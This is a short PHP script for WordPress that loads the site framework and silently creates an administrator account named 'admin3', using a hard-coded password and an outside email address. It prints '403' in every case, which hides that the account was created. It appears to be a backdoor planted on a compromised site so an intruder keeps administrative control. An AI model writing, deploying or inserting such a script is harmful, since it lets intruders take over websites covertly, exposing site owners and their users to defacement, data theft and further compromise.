<?php
// Load WordPress framework
require_once('wp-load.php');

// Define new admin user details
$new_username = 'admin3';
$new_password = '6u0pBKdzTq70doWBnNu)LY*t';
$new_email = 'sumseltoto67@gmail.com';

// Check if user already exists
if ( !username_exists($new_username) && !email_exists($new_email) ) {
    // Create new user
    $user_id = wp_create_user( $new_username, $new_password, $new_email );
    // Set the role to administrator
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );

    echo '403';
} else {
    echo '403';
}
?>
